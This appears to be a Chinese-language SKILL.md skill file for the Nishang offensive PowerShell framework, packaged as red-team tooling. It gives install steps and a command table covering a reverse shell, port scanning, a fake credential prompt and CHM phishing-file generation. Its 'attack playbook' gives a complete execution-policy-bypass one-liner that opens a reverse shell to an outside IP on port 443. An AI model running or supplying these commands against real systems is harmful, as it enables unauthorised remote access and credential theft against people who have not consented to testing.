---
name: nishang-powershell
description: Nishang: PowerShell 渗透脚本全家桶。信号:红队,方法论,加载框架,反弹,端口扫。
---

# Nishang

- 攻击大类:C50 红队方法论与自动化
- 上游仓库:https://github.com/samratashok/nishang
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/samratashok/nishang
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `Import-Module ./Nishang.ps1` | 加载框架 |
| `Invoke-PowerShellTcp -Reverse -IPAddress x -Port 443` | 反弹 |
| `Invoke-PortScan` | 端口扫 |
| `Get-Information` | 系统信息 |
| `Invoke-CredentialsPhish` | 弹凭据框 |
| `Out-CHM` | 生成 CHM 钓鱼文件 |
| `HTTP-Listener` | HTTP 服务 |

## 攻击场景 Playbook

### PowerShell 渗透脚本全家桶

```bash
powershell -ep bypass -c 'Import-Module ./nishang/Nishang.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.8.0.2 -Port 443'
```

## 注意事项

Offensive PowerShell 经典集;脚本可单独拷贝使用,与 Empire/WinPwn 互补。
